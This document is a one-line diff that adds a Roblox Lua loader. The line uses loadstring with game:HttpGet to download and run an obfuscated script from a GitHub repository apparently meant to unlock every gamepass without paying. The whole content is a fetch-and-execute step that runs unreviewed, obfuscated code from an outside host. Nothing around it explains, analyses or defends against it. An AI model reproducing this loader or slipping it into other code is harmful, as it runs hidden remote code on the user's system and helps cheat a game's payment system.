@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StroobWasTaken/Get-All-Gamepasses/main/mainscript_obf.lua"))();
